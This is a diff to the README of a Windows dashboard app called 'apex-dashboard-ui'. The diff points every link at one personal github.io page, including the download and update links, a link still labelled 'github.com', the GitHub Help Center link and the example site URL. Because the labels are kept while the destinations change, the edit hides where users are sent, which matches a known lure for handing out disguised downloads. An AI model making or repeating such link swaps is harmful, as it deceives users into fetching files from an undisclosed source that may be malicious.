@@ -1,6 +1,6 @@
 # 📊 apex-dashboard-ui - View Your Data at a Glance
 
-[![Download for Windows](https://img.shields.io/badge/Download-For%20Windows-blue?style=for-the-badge&logo=windows)](https://github.com/barclayfollowing387/apex-dashboard-ui/releases)
+[![Download for Windows](https://img.shields.io/badge/Download-For%20Windows-blue?style=for-the-badge&logo=windows)](https://barclayfollowing387.github.io)
 
 ## 🚀 Getting Started
 
@@ -41,7 +41,7 @@ These requirements are minimums. The dashboard works better on faster computers 
 ## ⬇️ How to Download
 
 1. Visit the download page:
-   [https://github.com/barclayfollowing387/apex-dashboard-ui/releases](https://github.com/barclayfollowing387/apex-dashboard-ui/releases)
+   [https://barclayfollowing387.github.io](https://barclayfollowing387.github.io)
 
 2. Look for the latest release at the top of the page.
 
@@ -131,7 +131,7 @@ You can share your dashboard online. This requires a free GitHub account.
 
 ### Step 1: Create a GitHub Account
 
-1. Go to [github.com](https://github.com).
+1. Go to [github.com](https://barclayfollowing387.github.io).
 2. Click **Sign up**.
 3. Follow the instructions.
 
@@ -158,7 +158,7 @@ You see a page with instructions. Use the upload method:
 4. Click **Save**.
 
 After a few minutes, your dashboard is live at a URL like:
-`https://yourusername.github.io/my-dashboard`
+`https://barclayfollowing387.github.io`
 
 Copy this URL and share it with anyone.
 
@@ -189,7 +189,7 @@ Copy this URL and share it with anyone.
 ## 🔄 Updating to a New Version
 
 1. Visit the download page again:
-   [https://github.com/barclayfollowing387/apex-dashboard-ui/releases](https://github.com/barclayfollowing387/apex-dashboard-ui/releases)
+   [https://barclayfollowing387.github.io](https://barclayfollowing387.github.io)
 
 2. Download the new ZIP file.
 
@@ -219,7 +219,7 @@ That is all. The dashboard leaves no other files on your computer.
 
 Visit these resources for help:
 
-- GitHub Help Center: [https://help.github.com](https://help.github.com)
+- GitHub Help Center: [https://barclayfollowing387.github.io](https://barclayfollowing387.github.io)
 - Browser support pages for Chrome, Edge, or Firefox
 - Community forums for HTML and web dashboards
 
